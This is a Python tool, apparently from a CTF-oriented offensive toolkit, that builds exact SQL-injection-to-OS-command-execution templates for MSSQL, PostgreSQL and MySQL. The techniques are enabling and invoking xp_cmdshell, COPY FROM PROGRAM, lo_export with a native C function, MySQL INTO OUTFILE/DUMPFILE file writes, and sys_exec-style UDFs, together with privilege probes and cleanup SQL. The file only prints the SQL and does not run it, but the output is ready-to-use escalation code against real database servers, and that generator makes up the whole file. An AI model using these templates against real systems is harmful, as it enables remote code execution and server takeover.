#!/usr/bin/env python3
"""Offline, prerequisite-gated SQL-to-OS escalation templates.

``sqli_rce_plans.py`` intentionally emits metadata only.  This companion starts
after a DBMS and injection shape have already been established and renders exact,
reviewable SQL for three high-value CTF primitives.  It never connects to a
database, executes SQL, writes a file, or runs the supplied command.
"""

from __future__ import annotations

import argparse
import json
import posixpath
import re
import sys
from dataclasses import asdict, dataclass
from typing import Mapping, Sequence


MAX_TEXT = 4096
MAX_FACTS = 32
INJECTION_MODES = ("unknown", "boolean", "error", "union", "stacked", "procedure")
DATABASES = ("mssql", "postgresql", "mysql")
_ALIASES = {
    "sqlserver": "mssql",
    "sql_server": "mssql",
    "microsoft_sql_server": "mssql",
    "postgres": "postgresql",
    "pgsql": "postgresql",
    "mariadb": "mysql",
}
_TECHNIQUES = {
    "mssql": ("xp_cmdshell",),
    "postgresql": ("copy_program", "large_object_udf"),
    "mysql": ("outfile", "dumpfile", "udf"),
}
_FACTS = {
    "mssql": frozenset({
        "is_sysadmin", "has_control_server", "xp_cmdshell_enabled",
        "proxy_configured", "xp_execute_granted", "show_advanced_enabled",
    }),
    "postgresql": frozenset({
        "server_version_num", "is_superuser", "has_pg_execute_server_program",
        "has_pg_write_server_files", "can_create_c_function", "abi_match",
    }),
    "mysql": frozenset({
        "file_privilege", "secure_file_priv", "target_directory_writable",
        "plugin_dir", "udf_library_present", "can_create_function",
    }),
}


class WebDepthSQLTemplateError(ValueError):
    """A SQL template input is malformed, unsupported, or over a bound."""


@dataclass(frozen=True)
class SQLRCETemplate:
    database: str
    technique: str
    injection_mode: str
    readiness: str
    probes: tuple[str, ...]
    action_sql: tuple[str, ...]
    cleanup_sql: tuple[str, ...]
    preconditions: tuple[str, ...]
    blockers: tuple[str, ...]
    unverified: tuple[str, ...]
    side_effects: tuple[str, ...]
    notes: tuple[str, ...]
    offline: bool = True
    network_requests: int = 0
    executed: bool = False

    def as_dict(self) -> dict[str, object]:
        row = asdict(self)
        for name in (
            "probes", "action_sql", "cleanup_sql", "preconditions", "blockers",
            "unverified", "side_effects", "notes",
        ):
            row[name] = list(row[name])
        return row


def _database(value: object) -> str:
    if not isinstance(value, str):
        raise WebDepthSQLTemplateError("database must be text")
    name = _ALIASES.get(value.strip().lower(), value.strip().lower())
    if name not in DATABASES:
        raise WebDepthSQLTemplateError(f"database must be one of: {', '.join(DATABASES)}")
    return name


def _mode(value: object) -> str:
    if not isinstance(value, str) or value not in INJECTION_MODES:
        raise WebDepthSQLTemplateError(f"injection_mode must be one of: {', '.join(INJECTION_MODES)}")
    return value


def _technique(database: str, value: object) -> str:
    if not isinstance(value, str) or value not in _TECHNIQUES[database]:
        raise WebDepthSQLTemplateError(
            f"technique for {database} must be one of: {', '.join(_TECHNIQUES[database])}"
        )
    return value


def _text(value: object, label: str, *, allow_empty: bool = False) -> str:
    if not isinstance(value, str):
        raise WebDepthSQLTemplateError(f"{label} must be text")
    if (not value and not allow_empty) or len(value) > MAX_TEXT:
        qualifier = "0" if allow_empty else "1"
        raise WebDepthSQLTemplateError(f"{label} must contain {qualifier}..{MAX_TEXT} characters")
    if "\x00" in value or "\r" in value:
        raise WebDepthSQLTemplateError(f"{label} contains a forbidden control character")
    return value


def _identifier(value: object, label: str) -> str:
    raw = _text(value, label)
    if not re.fullmatch(r"[A-Za-z_][A-Za-z0-9_]{0,62}", raw):
        raise WebDepthSQLTemplateError(f"{label} must be a conservative SQL identifier")
    return raw


def sql_text_expression(database: str, value: str) -> str:
    """Return a dialect-safe text expression without executing it."""

    try:
        db = _database(database)
        raw = _text(value, "value", allow_empty=True)
        if db == "mssql":
            return "N'" + raw.replace("'", "''") + "'"
        if db == "postgresql":
            return "E'" + raw.replace("\\", "\\\\").replace("'", "''") + "'"
        return "CONVERT(0x" + raw.encode("utf-8").hex() + " USING utf8mb4)"
    except WebDepthSQLTemplateError:
        raise
    except Exception as exc:
        raise WebDepthSQLTemplateError("could not encode SQL text") from exc


def _facts(database: str, values: Mapping[str, object] | None) -> dict[str, object]:
    if values is None:
        return {}
    if not isinstance(values, Mapping):
        raise WebDepthSQLTemplateError("facts must be a mapping")
    if len(values) > MAX_FACTS:
        raise WebDepthSQLTemplateError(f"fact cap exceeded ({MAX_FACTS})")
    unknown = sorted(set(values) - _FACTS[database])
    if unknown:
        raise WebDepthSQLTemplateError(f"unknown {database} fact(s): {', '.join(map(str, unknown))}")
    result: dict[str, object] = {}
    for key, value in values.items():
        if key == "server_version_num":
            if isinstance(value, bool) or not isinstance(value, int) or value < 0 or value > 99_999_999:
                raise WebDepthSQLTemplateError("server_version_num must be a non-negative integer")
        elif key in {"secure_file_priv", "plugin_dir"}:
            if value is not None:
                _text(value, key, allow_empty=True)
        elif value is not True and value is not False and value is not None:
            raise WebDepthSQLTemplateError(f"fact {key} must be true, false, or null")
        result[key] = value
    return result


def _probe_catalog(database: str) -> tuple[str, ...]:
    if database == "mssql":
        return (
            "SELECT CAST(SERVERPROPERTY('ProductVersion') AS nvarchar(128)) AS product_version, SYSTEM_USER AS login_name, IS_SRVROLEMEMBER('sysadmin') AS is_sysadmin, HAS_PERMS_BY_NAME(NULL,NULL,'CONTROL SERVER') AS has_control_server;",
            "SELECT name, CAST(value_in_use AS int) AS value_in_use FROM sys.configurations WHERE name IN ('show advanced options','xp_cmdshell') ORDER BY name;",
            "SELECT CASE WHEN EXISTS (SELECT 1 FROM sys.credentials WHERE name='##xp_cmdshell_proxy_account##') THEN 1 ELSE 0 END AS proxy_configured;",
        )
    if database == "postgresql":
        return (
            "SELECT version(), current_user, current_setting('server_version_num')::integer AS server_version_num;",
            "SELECT rolsuper, pg_has_role(current_user,'pg_execute_server_program','MEMBER') AS can_execute_program, pg_has_role(current_user,'pg_write_server_files','MEMBER') AS can_write_server_files FROM pg_roles WHERE rolname=current_user;",
        )
    return (
        "SELECT VERSION() AS version, CURRENT_USER() AS privilege_account, USER() AS authenticated_account, @@version_compile_os AS compile_os, @@version_compile_machine AS compile_machine, @@secure_file_priv AS secure_file_priv, @@plugin_dir AS plugin_dir;",
        "SHOW GRANTS FOR CURRENT_USER();",
    )


class _Verdict:
    def __init__(self) -> None:
        self.preconditions: list[str] = []
        self.blockers: list[str] = []
        self.unverified: list[str] = []

    def need(self, state: object, description: str) -> None:
        self.preconditions.append(description)
        if state is False:
            self.blockers.append(description)
        elif state is not True:
            self.unverified.append(description)

    def any_of(self, states: Sequence[object], description: str) -> None:
        self.preconditions.append(description)
        if any(state is True for state in states):
            return
        if all(state is False for state in states):
            self.blockers.append(description)
        else:
            self.unverified.append(description)

    def value(self) -> str:
        return "blocked" if self.blockers else "unverified" if self.unverified else "ready_for_review"


def _statement_control(mode: str, verdict: _Verdict) -> None:
    verdict.need(
        mode in {"stacked", "procedure"},
        "the established injection context permits a standalone statement or procedure batch",
    )


def _tri_and(left: object, right: object) -> bool | None:
    if left is False or right is False:
        return False
    if left is True and right is True:
        return True
    return None


def _mssql_plan(mode: str, command: str, facts: dict[str, object]) -> SQLRCETemplate:
    verdict = _Verdict()
    _statement_control(mode, verdict)
    if command.count('"') > 2:
        verdict.blockers.append("xp_cmdshell command_string permits at most one pair of double quotes")
    enabled = facts.get("xp_cmdshell_enabled")
    sysadmin = facts.get("is_sysadmin")
    control = facts.get("has_control_server")
    if enabled is True:
        verdict.any_of(
            (sysadmin, _tri_and(facts.get("proxy_configured"), facts.get("xp_execute_granted"))),
            "the login is sysadmin or has EXECUTE plus a configured xp_cmdshell proxy",
        )
    elif enabled is False:
        verdict.any_of(
            (sysadmin, control),
            "the login can enable xp_cmdshell through sysadmin/CONTROL SERVER authority",
        )
    else:
        verdict.unverified.append("the current xp_cmdshell value_in_use is known")
        verdict.preconditions.append("the current xp_cmdshell value_in_use is known")
        verdict.any_of(
            (sysadmin, control,
             _tri_and(facts.get("proxy_configured"), facts.get("xp_execute_granted"))),
            "the login can enable or execute xp_cmdshell in its effective security context",
        )

    literal = sql_text_expression("mssql", command)
    action: list[str] = []
    cleanup: list[str] = []
    if verdict.value() != "blocked":
        if enabled is not True:
            action.extend((
                "EXEC master.dbo.sp_configure N'show advanced options', 1; RECONFIGURE;",
                "EXEC master.dbo.sp_configure N'xp_cmdshell', 1; RECONFIGURE;",
            ))
        action.append(f"EXEC master.dbo.xp_cmdshell {literal};")
        if enabled is False:
            cleanup.append("EXEC master.dbo.sp_configure N'xp_cmdshell', 0; RECONFIGURE;")
            if facts.get("show_advanced_enabled") is False:
                cleanup.append("EXEC master.dbo.sp_configure N'show advanced options', 0; RECONFIGURE;")
    return SQLRCETemplate(
        "mssql", "xp_cmdshell", mode, verdict.value(), _probe_catalog("mssql"),
        tuple(action), tuple(cleanup), tuple(verdict.preconditions), tuple(verdict.blockers),
        tuple(verdict.unverified),
        ("enabling xp_cmdshell changes instance configuration", "the command runs synchronously as the SQL Server service account or configured proxy"),
        ("xp_cmdshell is disabled by default on new installations", "capture original configuration before changing it", "command_string is bounded to nvarchar(4000) here"),
    )


def _postgres_plan(
    technique: str,
    mode: str,
    command: str,
    facts: dict[str, object],
    *,
    object_id: int | None,
    library_path: str | None,
    function_name: str,
    function_symbol: str,
) -> SQLRCETemplate:
    verdict = _Verdict()
    _statement_control(mode, verdict)
    action: list[str] = []
    cleanup: list[str] = []
    effects: list[str] = []
    notes: list[str] = []
    version = facts.get("server_version_num")
    if technique == "copy_program":
        verdict.preconditions.append("PostgreSQL 9.3 or newer provides COPY PROGRAM")
        if version is None:
            verdict.unverified.append("PostgreSQL 9.3 or newer provides COPY PROGRAM")
        elif int(version) < 90300:
            verdict.blockers.append("PostgreSQL 9.3 or newer provides COPY PROGRAM")
        verdict.any_of(
            (facts.get("is_superuser"), facts.get("has_pg_execute_server_program")),
            "the role is superuser or a member of pg_execute_server_program",
        )
        if verdict.value() != "blocked":
            cmd = sql_text_expression("postgresql", command)
            action.extend((
                "CREATE TEMP TABLE webdepth_cmd_output(line text);",
                f"COPY webdepth_cmd_output FROM PROGRAM {cmd};",
                "SELECT line FROM webdepth_cmd_output ORDER BY ctid;",
            ))
            cleanup.append("DROP TABLE IF EXISTS pg_temp.webdepth_cmd_output;")
        effects.append("COPY FROM PROGRAM launches a shell command as the PostgreSQL operating-system account")
        notes.append("COPY FROM PROGRAM captures standard output as table rows; OS policy such as SELinux can still deny execution")
    else:
        verdict.need(facts.get("is_superuser"), "the role is PostgreSQL superuser")
        verdict.need(facts.get("can_create_c_function"), "the role can create an untrusted C-language function")
        verdict.need(facts.get("abi_match"), "the supplied shared object exactly matches server OS, architecture, PostgreSQL ABI, and exported signature")
        if object_id is None:
            verdict.preconditions.append("the staged large-object OID is known")
            verdict.unverified.append("the staged large-object OID is known")
        if library_path is None:
            verdict.preconditions.append("an absolute server-side shared-library output path is known")
            verdict.unverified.append("an absolute server-side shared-library output path is known")
        if verdict.value() != "blocked" and object_id is not None and library_path is not None:
            lib = sql_text_expression("postgresql", library_path)
            symbol = sql_text_expression("postgresql", function_symbol)
            cmd = sql_text_expression("postgresql", command)
            action.extend((
                f"SELECT lo_export({object_id}, {lib});",
                f"CREATE FUNCTION {function_name}(text) RETURNS text AS {lib}, {symbol} LANGUAGE C STRICT;",
                f"SELECT {function_name}({cmd});",
            ))
            cleanup.append(f"DROP FUNCTION IF EXISTS {function_name}(text);")
        effects.extend(("lo_export writes a server-side shared object as the PostgreSQL OS account", "CREATE FUNCTION loads native code into the database process"))
        notes.extend(("this planner does not construct or upload the large object", "remove the staged file and large object only after confirming ownership; no deletion SQL is emitted"))
    return SQLRCETemplate(
        "postgresql", technique, mode, verdict.value(), _probe_catalog("postgresql"),
        tuple(action), tuple(cleanup), tuple(verdict.preconditions), tuple(verdict.blockers),
        tuple(verdict.unverified), tuple(effects), tuple(notes),
    )


def _mysql_path(value: object) -> str:
    raw = _text(value, "target_path")
    if not raw.startswith("/") or not re.fullmatch(r"/[A-Za-z0-9_./-]{1,2047}", raw):
        raise WebDepthSQLTemplateError("target_path must be a conservative absolute POSIX path")
    normalized = posixpath.normpath(raw)
    if normalized != raw or "/../" in raw or raw.endswith("/.."):
        raise WebDepthSQLTemplateError("target_path must be normalized and contain no parent traversal")
    return raw


def _secure_file_allows(setting: object, target: str) -> bool | None:
    if setting is None:
        return None
    if not isinstance(setting, str):
        raise WebDepthSQLTemplateError("secure_file_priv must be text or null")
    if setting.casefold() in {"null", "disabled"}:
        return False
    if setting == "":
        return True
    directory = posixpath.normpath(setting.replace("\\", "/"))
    wanted = posixpath.normpath(target)
    return wanted.startswith(directory.rstrip("/") + "/")


def _mysql_plan(
    technique: str,
    mode: str,
    command: str,
    content: str,
    facts: dict[str, object],
    *,
    target_path: str | None,
    function_name: str,
    soname: str,
) -> SQLRCETemplate:
    verdict = _Verdict()
    _statement_control(mode, verdict)
    action: list[str] = []
    cleanup: list[str] = []
    effects: list[str] = []
    notes: list[str] = []
    if technique in {"outfile", "dumpfile"}:
        if target_path is None:
            verdict.preconditions.append("the exact new server-side target path is known")
            verdict.unverified.append("the exact new server-side target path is known")
            target = None
        else:
            target = _mysql_path(target_path)
        verdict.need(facts.get("file_privilege"), "the effective MySQL account has global FILE privilege")
        verdict.need(facts.get("target_directory_writable"), "the mysqld operating-system account can write the target directory")
        if target is not None:
            allowed = _secure_file_allows(facts.get("secure_file_priv"), target)
            verdict.need(allowed, "secure_file_priv permits the exact target path")
        if verdict.value() != "blocked" and target is not None:
            data = content.encode("utf-8").hex()
            if technique == "dumpfile":
                action.append(f"SELECT 0x{data} INTO DUMPFILE '{target}';")
            else:
                action.append(
                    f"SELECT 0x{data} INTO OUTFILE '{target}' FIELDS TERMINATED BY '' ESCAPED BY '' LINES TERMINATED BY '';"
                )
        effects.append("the database server creates a new file owned by the mysqld operating-system account")
        notes.extend(("INTO OUTFILE/DUMPFILE cannot overwrite an existing file", "DUMPFILE writes one raw row; OUTFILE formatting is explicitly reduced to empty separators"))
    else:
        verdict.need(facts.get("udf_library_present"), "a reviewed, platform-compatible UDF library already exists in plugin_dir")
        verdict.need(facts.get("can_create_function"), "the account can register a loadable MySQL function")
        plugin_dir = facts.get("plugin_dir")
        if plugin_dir is None:
            verdict.preconditions.append("the effective plugin_dir is known")
            verdict.unverified.append("the effective plugin_dir is known")
        if verdict.value() != "blocked" and plugin_dir is not None:
            command_expr = sql_text_expression("mysql", command)
            action.extend((
                f"CREATE FUNCTION {function_name} RETURNS STRING SONAME '{soname}';",
                f"SELECT {function_name}({command_expr});",
            ))
            cleanup.append(f"DROP FUNCTION IF EXISTS {function_name};")
        effects.append("CREATE FUNCTION loads a native library into the mysqld process")
        notes.extend(("sys_exec/sys_eval are third-party UDF symbols, not built-in MySQL functions", "the SONAME is a basename resolved inside plugin_dir"))
    return SQLRCETemplate(
        "mysql", technique, mode, verdict.value(), _probe_catalog("mysql"),
        tuple(action), tuple(cleanup), tuple(verdict.preconditions), tuple(verdict.blockers),
        tuple(verdict.unverified), tuple(effects), tuple(notes),
    )


def build_sql_rce_template(
    database: str,
    technique: str,
    *,
    injection_mode: str = "unknown",
    command: str = "printf WEBDEPTH_SQL_MARKER",
    content: str = "WEBDEPTH_SQL_MARKER",
    target_path: str | None = None,
    object_id: int | None = None,
    library_path: str | None = None,
    function_name: str = "webdepth_exec",
    function_symbol: str = "webdepth_exec",
    soname: str = "lib_mysqludf_sys.so",
    facts: Mapping[str, object] | None = None,
) -> SQLRCETemplate:
    """Return one exact, non-executing SQL escalation template."""

    try:
        db = _database(database)
        selected = _technique(db, technique)
        mode = _mode(injection_mode)
        command_value = _text(command, "command", allow_empty=True)
        content_value = _text(content, "content", allow_empty=True)
        fact_values = _facts(db, facts)
        fn = _identifier(function_name, "function_name")
        symbol = _identifier(function_symbol, "function_symbol")
        if isinstance(object_id, bool) or (object_id is not None and (not isinstance(object_id, int) or not 1 <= object_id <= 0xFFFFFFFF)):
            raise WebDepthSQLTemplateError("object_id must be an unsigned non-zero 32-bit integer")
        if library_path is not None:
            library_path = _text(library_path, "library_path")
            if not library_path.startswith("/") or ".." in library_path.split("/"):
                raise WebDepthSQLTemplateError("library_path must be an absolute normalized server path")
        soname_value = _text(soname, "soname")
        if not re.fullmatch(r"[A-Za-z0-9_.-]{1,255}\.(?:so|dll|dylib)", soname_value, re.I):
            raise WebDepthSQLTemplateError("soname must be a shared-library basename")
        if db == "mssql":
            if len(command_value) > 4000:
                raise WebDepthSQLTemplateError("xp_cmdshell command exceeds the nvarchar(4000) planner bound")
            return _mssql_plan(mode, command_value, fact_values)
        if db == "postgresql":
            return _postgres_plan(
                selected, mode, command_value, fact_values, object_id=object_id,
                library_path=library_path, function_name=fn, function_symbol=symbol,
            )
        return _mysql_plan(
            selected, mode, command_value, content_value, fact_values,
            target_path=target_path, function_name=fn, soname=soname_value,
        )
    except WebDepthSQLTemplateError:
        raise
    except Exception as exc:  # public fail-closed boundary
        raise WebDepthSQLTemplateError("could not build SQL RCE template") from exc


def _fact(text: str) -> tuple[str, object]:
    if "=" not in text:
        raise WebDepthSQLTemplateError("--fact must be NAME=VALUE")
    name, raw = text.split("=", 1)
    if not re.fullmatch(r"[a-z][a-z0-9_]{0,63}", name):
        raise WebDepthSQLTemplateError("fact name is malformed")
    folded = raw.casefold()
    if folded in {"true", "yes"}:
        value: object = True
    elif folded in {"false", "no"}:
        value = False
    elif folded in {"null", "unknown"}:
        value = None
    elif re.fullmatch(r"[0-9]{1,8}", raw):
        value = int(raw)
    else:
        value = raw
    return name, value


def _parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description="Build offline SQL-to-OS escalation templates")
    parser.add_argument("database", choices=DATABASES)
    parser.add_argument("technique")
    parser.add_argument("--injection-mode", choices=INJECTION_MODES, default="unknown")
    parser.add_argument("--command", default="printf WEBDEPTH_SQL_MARKER")
    parser.add_argument("--content", default="WEBDEPTH_SQL_MARKER")
    parser.add_argument("--target-path")
    parser.add_argument("--object-id", type=int)
    parser.add_argument("--library-path")
    parser.add_argument("--function-name", default="webdepth_exec")
    parser.add_argument("--function-symbol", default="webdepth_exec")
    parser.add_argument("--soname", default="lib_mysqludf_sys.so")
    parser.add_argument("--fact", action="append", default=[])
    parser.add_argument("--json", action="store_true")
    return parser


def main(argv: Sequence[str] | None = None) -> int:
    try:
        args = _parser().parse_args(list(argv) if argv is not None else None)
    except SystemExit as exc:
        return exc.code if isinstance(exc.code, int) else 2
    try:
        facts = dict(_fact(item) for item in args.fact)
        plan = build_sql_rce_template(
            args.database,
            args.technique,
            injection_mode=args.injection_mode,
            command=args.command,
            content=args.content,
            target_path=args.target_path,
            object_id=args.object_id,
            library_path=args.library_path,
            function_name=args.function_name,
            function_symbol=args.function_symbol,
            soname=args.soname,
            facts=facts,
        )
    except WebDepthSQLTemplateError as exc:
        print(f"webdepth_sql_rce_templates: {exc}", file=sys.stderr)
        return 2
    if args.json:
        print(json.dumps(plan.as_dict(), indent=2, sort_keys=True))
    else:
        print(f"{plan.database}/{plan.technique}: {plan.readiness}")
        for row in plan.probes:
            print(f"PROBE: {row}")
        for row in plan.action_sql:
            print(f"ACTION: {row}")
        for row in plan.cleanup_sql:
            print(f"CLEANUP: {row}")
        for row in plan.blockers:
            print(f"BLOCKED: {row}")
        for row in plan.unverified:
            print(f"UNVERIFIED: {row}")
    return 0


__all__ = [
    "DATABASES",
    "INJECTION_MODES",
    "SQLRCETemplate",
    "WebDepthSQLTemplateError",
    "build_sql_rce_template",
    "main",
    "sql_text_expression",
]


if __name__ == "__main__":
    raise SystemExit(main())
